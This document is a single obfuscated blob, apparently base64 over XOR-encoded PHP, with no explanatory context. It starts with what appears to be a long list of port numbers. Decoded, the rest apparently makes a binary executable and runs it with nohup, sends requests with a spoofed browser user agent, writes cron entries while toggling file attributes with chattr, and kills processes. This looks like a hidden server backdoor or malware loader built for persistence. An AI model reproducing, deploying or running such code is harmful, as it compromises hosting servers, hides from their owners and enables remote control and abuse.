HgYYHx0ZHwYYHxMGGBwGGBwaGwYYHBoYBhgcGh4GGBwaHwYYHBodBhgcGhIGGBwYGx4GGBwZEgYYHB4GGBwcHBwGGB0aGhoGGB0aGwYYHRoYBhgdGxoGGB0bHQYYHRsSBhgdGB8GGB0ZHxgGGB0ZHxkGGB0ZHx8GGB0ZHxwGGB0dGx8GGB0dHR0GGBIaBhgSGhoGGBIaEhoGGBIaEwYYEhsbBhgSGBobBhgSHBMGGBIdHwYYEhISEgYYExoTBhgTGhMaBhgTGxoGGBMYGgYYExwdBhgTHBIGGBMTEgYYExMTEwYZBhkaBhkaGhoGGRoaGhoGGRoaGwYZGhoYBhkaGhkGGRoaHgYZGhofBhkaGhwGGRoaHQYZGhoSBhkaGhMGGRobBhkaGxoGGRobGwYZGhsZBhkaGx0GGRoZGgYZGhkbBhkaHxgGGRocBhkaHRsGGRodGxIGGRodHQYZGhMfGwYZGxoZEgYZGxsGGRsbGxsGGRsYEgYZGxkbBhkbGRkdBhkbHBIGGRgGGRgbGwYZGBgbBhkYGBgYBhkYHhoaBhkYHBoGGRgcGwYZGBwSBhkYHBMGGRgdHBIGGRgdHBMGGRgdHRoGGRgdHRsGGRgdHRgGGRgdHRkGGRgdHR4GGRgdHR8GGRgdHRwGGRgdHR0GGRgdHRIGGRgdHRMGGRgdEhoGGRgdEhsGGRgdEhgGGRgdEhkGGRgdEh4GGRgdEh8GGRgSGQYZGQYZGRoaBhkZGhsGGRkaHAYZGRgYBhkZGBkGGRkYHgYZGRgfBhkZGRkGGRkZGRkGGRkZHx4GGRkeHgYZGR8bBhkZHB0GGRkcEwYZGR0aBhkZHRsGGRkdGAYZGRITBhkZEhMTBhkZExoGGR4aBhkeGh4GGR4eGQYZHh4eHgYZHh8dGwYZHh8dGAYZHh8dGQYZHh0cBhkeExkGGR8bHQYZHxgYBhkfGB0GGR8eHAYZHx8aGgYZHx8bBhkfHx8fBhkfEhoGGRwfEwYZHBwGGRwcHBwGGRwSEwYZHBMaBhkdBhkdGhkGGR0ZHQYZHRwcBhkdHR0dBhkdEh4GGRIaGgYZEhobBhkSGhIaBhkSGhMGGRIbHgYZEhgcBhkSGB0GGRIYEgYZEhgTGAYZEh8bBhkSHBMGGRIdGwYZEh0SBhkSEhoGGRISEhIGGRISEwYZEhMGGRMaHwYZExoTGgYZExseBhkTGxIGGRMYGgYZEx4fBhkTHRsGGRMSHAYZExMfBhkTExIGGRMTExMGHgYeGhoaBh4aGhoaBh4aGhsGHhoaGAYeGhoZBh4aGh4GHhoaHwYeGhocBh4aGh0GHhoaEgYeGhoTBh4aGxoGHhobExkGHhoeGgYeGh4fBh4aHAYeGh0GHhoSGgYeGhMbGwYeGxsbBh4bGxsbBh4bGB8GHhsYHAYeGxgTBh4bHhsGHhsfGxsGHhscBh4bHQYeGAYeGBgYGAYeGBgeBh4YHhgGHhgfBh4YHxsaBh4YHQYeGB0TBh4ZBh4ZGBsGHhkZGRkGHhkeGQYeHhsdHAYeHhkGHh4ZGQYeHh4GHh4eGQYeHh4eBh4eHh4YBh4eHh4ZBh4eHh4eBh4eHh8GHh4eHAYeHh4TBh4eHwYeHh8aGwYeHh8fBh4fGxoaBh4fHxoGHh8fHx8GHh8cHQYeHxIGHhweBh4cHwYeHBwYBh4cHBwcBh4dHR0dBh4SGhIaBh4SGwYeEh4SBh4SEhISBh4SExMGHhMGHhMaGgYeExoTGgYeExsfGAYeExsfGQYeExsfHgYeExsfHwYeExsfHAYeExsfHQYeExsfEgYeExsfEwYeExscGgYeExscGwYeExscGQYeExscHwYeExscHQYeExsdHwYeExsdHAYeEx4aGgYeEx0GHhMTEgYeExMTEwYfGhoGHxoaGgYfGhoaGgYfGhoaGwYfGhoaGAYfGhoaGQYfGhoaHAYfGhobBh8aGhgGHxoaGQYfGhoeBh8aGh8GHxoaHAYfGhodBh8aGhIGHxoaEwYfGhsaBh8aGRoGHxoZGhoGHxoZGQYfGhkSEwYfGh8aBh8aHxoaBh8aHxsGHxofHgYfGhwaBh8aHBsGHxocGRwGHxoSGgYfGhIaGgYfGhIbBh8aEh0GHxsaGgYfGxobBh8bGhgGHxsbGhkGHxsbGxsGHxsYBh8bGBoGHxsZBh8bHgYfGx4TGQYfGx8GHxsfGwYfGxMaBh8YGhoGHxgbHgYfGBgbBh8YGBgGHxgYGBgGHxgYHwYfGBgcBh8YHgYfGB8YBh8YHB0ZBh8YHBMGHxgSGgYfGBIYGAYfGBIeEgYfGBIcEwYfGBMSBh8ZBh8ZGhoGHxkZGRkGHxkfGQYfGR8dBh8eGhoGHx4aHh8GHx4aHwYfHhsGHx4bHgYfHhkGHx4ZGwYfHhkYBh8eGRgSBh8eHgYfHh4aBh8eHhkGHx4eHh4GHx4fBh8eHx4GHx4SBh8fGhoGHx8aHx8GHx8aHxwGHx8bGgYfHx4GHx8eHgYfHx8GHx8fGgYfHx8fBh8fHx8fBh8fHBoGHx8cGhoGHx8cHAYfHBoaBh8cGQYfHBkbBh8cGRkGHxwfHAYfHBwcBh8cHBwcBh8cHRkdBh8cHRkSBh8cHRIGHxwdEwYfHRoaBh8dGxIGHx0YEx4GHx0ZGgYfHR8dBh8dHR0dBh8dHRMdBh8SGhoGHxIaGwYfEhoYBh8SGhIaBh8SGxoGHxIbGwYfEhsfBh8SGBgGHxIYHwYfEh8aBh8SHxIGHxIfEwYfEhwYBh8SHQYfEh0dBh8SEhISBh8TGhoGHxMaGwYfExoYBh8TGhkGHxMaHgYfExocBh8TGh0GHxMaExoGHxMbGgYfExsbBh8TGx8GHxMYGAYfExgfBh8TGQYfEx8aBh8THxgGHxMfEwYfExwaBh8THBsGHxMcGAYfExwZBh8TEh0GHxMSEgYfExITBh8TExIGHxMTEwYfExMTEwYcBhwaGhoGHBoaGwYcGhoYBhwaGhgaBhwaGhkGHBoaHgYcGhofBhwaGhwGHBoaHQYcGhoSBhwaGhMGHBobGgYcGhgfBhwaHh4ZBhwaHxMGHBocGgYcGhIaBhwaEhsGHBsaGgYcGxobBhwbGhwGHBsbGxsGHBsbGAYcGxgZBhwbGBMGHBsfGRgGHBsfHAYcGxwGHBscGwYcGx0GHBsTGhoGHBgaGgYcGBodEgYcGBgYGAYcGB8GHBkaGgYcGRsGHBkZGRsGHBkZGRkGHBkeHAYcGRwGHBkSEwYcHhoaBhweHhkGHB4eHh4GHB4cBhweHBgZBhweHBIaBhweEgYcHxoaBhwfGhoaBhwfGhgGHB8bGgYcHxsYEwYcHxkSEwYcHx4ZBhwfHh0GHB8cHwYcHxwcBhwfHB0GHB8SGgYcHBoaBhwcHhwGHBwfHwYcHBwGHBwcGwYcHBwYBhwcHBkGHBwcHgYcHBwfBhwcHBwGHBwcHQYcHBwSBhwcHBMGHBwdBhwcHR0GHBwSBhwcEhMGHBwTGAYcHBMTBhwdGhoGHB0dEwYcHRISBhwdEhMGHB0TGAYcEhoaBhwSGQYcEhkTBhwSHQYcEhIbBhwTGhoGHBMaGwYcExsGHBMcEwYdBh0aBh0aGgYdGhoaBh0aGhsGHRoaGAYdGhoZBh0aGh4GHRoaHwYdGhocBh0aGh0GHRoaEgYdGhoTBh0aGxoGHRobEwYdGhgfBh0aHwYdGh0aBh0aEhsGHRsaGgYdGxoZBh0bGhwGHRsbBh0bHgYdGx0bBh0YGgYdGBoaBh0YGhsGHRgYBh0YGBoGHRgcBh0YHRgGHRkaGgYdGR0ZBh0eGhoGHR4aGAYdHhkfBh0eHhkGHR4dHgYdHhMGHR4THAYdHxoaBh0fGxgGHR8dHwYdHBoaBh0cGB8GHRwYHQYdHB8GHRwdHAYdHRoaBh0dGxoGHR0YGgYdHRkaBh0dHhoGHR0eGwYdHR8aBh0dHBoGHR0cHAYdHR0GHR0dGgYdHR0bBh0dHRgGHR0dGQYdHR0eBh0dHR8GHR0dHAYdHR0dBh0dHRIGHR0dEwYdHRIaBh0dEhIGHR0TGgYdEhoaBh0SGQYdEh0GHRIdEgYdEwYdExoaBh0TGxsGHRMYGgYdExgbBh0TGR0GHRMZEgYdExMTBhIaBhIaGgYSGhoaBhIaGhsGEhoaGAYSGhoZBhIaGh4GEhoaHwYSGhocBhIaGh0GEhoaEgYSGhoTBhIaGwYSGhsaBhIaGxsGEhoYGwYSGhgYBhIaGRsGEhoeGAYSGh4fBhIaEgYSGhIaBhIaEhsGEhoSGAYSGhIZBhIaEh4GEhoSHwYSGhIcBhIaEh0GEhoSEgYSGhITBhIaExoGEhoTGQYSGhMTBhIbBhIbGhoGEhsbGgYSGxgaBhIbGRoGEhseGgYSGx8aBhIbHBoGEhsdGgYSGxIaBhIbEhsGEhsTGgYSGxMYBhIbExkGEhsTHgYSGAYSGBoaBhIYGBgGEhgfHgYSGBIYBhIYExoGEhgTGwYSGBMYBhIZBhIZGhoGEhkZGQYSGRIZBhIeBhIeGhoGEh4aGAYSHhkGEh4eGQYSHhIeBhIfBhIfGhoGEh8SHwYSHBoaBhIcHhMGEhwfGwYSHB8YBhIcHx4GEhwSHAYSHRoaBhIdGhsGEh0ZBhIdEh0GEhIGEhIaBhISGhoGEhIbGgYSEhgaBhISGRoGEhIeGgYSEh8aBhISHBoGEhIdGgYSEh0ZBhISHR0GEhISBhISEhoGEhISGwYSEhIYBhISEhkGEhISHgYSEhIfBhISEhwGEhISHQYSEhISBhISExoGEhITEwYSEwYSExoaBhITEgYSExITBhITEx4GEwYTGgYTGhoGExoaGgYTGhobBhMaGhgGExoaGQYTGhoeBhMaGh8GExoaHAYTGhodBhMaGhIGExoaEwYTGhsGExobGgYTGhsbBhMaGAYTGhkGExoeGgYTGh8aBhMaHRsGExoSGgYTGhIbBhMaExoGExoTGwYTGhMTBhMbGhoGExsaGwYTGxoYBhMbGhkGExsbBhMbGxoGExsbGwYTGxgGExsTGwYTGBoaBhMYGh0GExgYGgYTGBMaBhMYExgGExkaGgYTGRMZBhMeGhoGEx4bHwYTHhsSBhMeHhkGEx4SHwYTHhMeBhMfGhoGEx8aGAYTHxoZBhMfGR8GEx8dHwYTHxMZBhMfEx4GEx8THwYTHBoaBhMcGxIGExwcHAYTHRoaBhMSGhoGExIbBhMSHQYTEh0cBhMSHR0GExIdEgYTEhMSBhMTBhMTGgYTExoaBhMTGxoGExMbHQYTExgGExMYGgYTExgTBhMTGQYTExkaBhMTHhoGExMeGQYTEx4eBhMTHwYTEx8aBhMTHBoGExMcEgYTEx0aBhMTEhoGExMSEgYTExMGExMTGgYTExMSBhMTExMDESBZX0gKWkVYXnVMQ0ROT1hRIEdTCgIOXktYTU9eBgoOWV5LWF51WkVYXgYKDk9ETnVaRVheAwoXCmp1ESBHUwoCDllFSUFPXgYOQkVZXktOTlgGDlhPR0VeT0JFWV4GDlpFWF4DESBqWkVYXlkKFwoCAxEgCkxFWE9LSUIKDlpFWF4KAmpYS111WkVYXlkDCiAKCgoKClEgCgoKCgoKCgoOWUVJQU9eChcKY2UQEHlFSUFPXhAQY2RvfgcURE9dAnpPT1hrTk5YChcUCg5eS1hNT14KBgp6T09YekVYXgoXFAoOWkVYXgoGCnpYRV5FChcUCg1eSVoNCgYKfkNHT0VfXgoXFAobAxEgCgoKCgoKCgpDTAIKDllFSUFPXgoDIAoKCgoKCgoKUSAKCgoKCgoKCgoKCgpaWENEXgoOWkVYXhEgCgoKCgoKCgoKCgoKT1JDXgoaESAKCgoKCgoKClcgCgoKCgoKCgpPRllPIAoKCgoKCgoKUSAKCgoKCgoKCgoKCgoJekVYXgpDWQpJRkVZT04GIAoKCgoKCgoKVyAKCgoKClcgVyBaRVhedUxDRE5PWAoCamt4bXxxGncGHR8G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ektYS0dZBAgHBwcHBwcHB3ZECBEgCgoKCgoKCgoKCgoKCgoKCkNMCgIOWklFR0dLRE5+U1pPCk9bCggbGwgDUQoJaUVHR0tETgpvUk9JX15DRUQgCgoKCgoKCgoKCgoKCgoKCgoKCgogCgoKCgoKCgoKCgoKCgoKCgoKCgpGRUlLRgoORV9eWl9eESAKCgoKCgoKCgoKCgoKCgoKCgoKCg5FX15aX14KFwoIZH9mZggRIAoKCgoKCgoKCgoKCgoKCgoKCgoKDkVfXlpfXgoXCkoOWklFR0dLRE56S1hLR1lKESAKCgoKCgoKCgoKCgoKCgoKCgoKCnlPRE5oS0lBeE9ZX0ZeAhgGDkNOBk9ESUVOT3VIS1lPHB4CDkVfXlpfXgMDESAKCgoKCgoKCgoKCgoKCgoKCgoKCnlPRE5oS0lBeV5LXk8CGwYOQ04DESAgCgoKCgoKCgoKCgoKCgoKCldPRllDTAIOWklFR0dLRE5+U1pPCk9bCggbCANRCgluRV1ERkVLTgpvUk9JX15PIAoKCgoKCgoKCgoKCgoKCgoKCgoKIAoKCgoKCgoKCgoKCgoKCgoKCgoKAg5YT0dFXk91QkVZXgYKDlhPR0VeT3VaRVheBgoOWE9HRV5PdVpLXkIGCg5GRUlLRnVaS15CAwoXCllaRkNeCgUGBQYOWklFR0dLRE56S1hLR1kRIAoKCgoKCgoKCgoKCgoKCgoKCgoKRkVJS0YKDkVfXlpfXgoXCghkf2ZmCBEgCgoKCgoKCgoKCgoKCgoKCgoKCgoORV9eWl9eChcKbkVdRGZFS05vUk9JAg5YT0dFXk91QkVZXgoGDlhPR0VeT3VaRVheCgYKDlhPR0VeT3VaS15CBgoORkVJS0Z1WkteQgMRCiAKCgoKCgoKCgoKCgoKCgoKCgoKCnlPRE5oS0lBeE9ZX0ZeAhsGDkNOBk9ESUVOT3VIS1lPHB4CDkVfXlpfXgMDESAgCgoKCgoKCgoKCgoKCgoKCldPRllDTAIOWklFR0dLRE5+U1pPCk9bCggZCANRCgluRV1ERkVLTgpvUk9JX15PCn0KektYS0dZIAoKCgoKCgoK